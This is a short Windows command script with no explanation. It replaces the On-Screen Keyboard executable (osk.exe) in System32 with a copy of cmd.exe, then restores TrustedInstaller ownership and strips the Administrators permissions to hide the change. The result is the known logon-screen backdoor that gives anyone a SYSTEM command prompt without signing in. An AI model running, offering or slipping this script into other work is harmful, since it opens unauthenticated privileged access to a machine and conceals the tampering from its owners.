takeown /F "C:\Windows\system32\osk.exe" /A
icacls "C:\Windows\system32\osk.exe" /grant Administrators:F
copy /y "C:\Windows\system32\cmd.exe" "C:\Windows\system32\osk.exe"
icacls "C:\Windows\system32\osk.exe" /setowner "NT SERVICE\TrustedInstaller"
icacls "C:\Windows\system32\osk.exe" /remove Administrators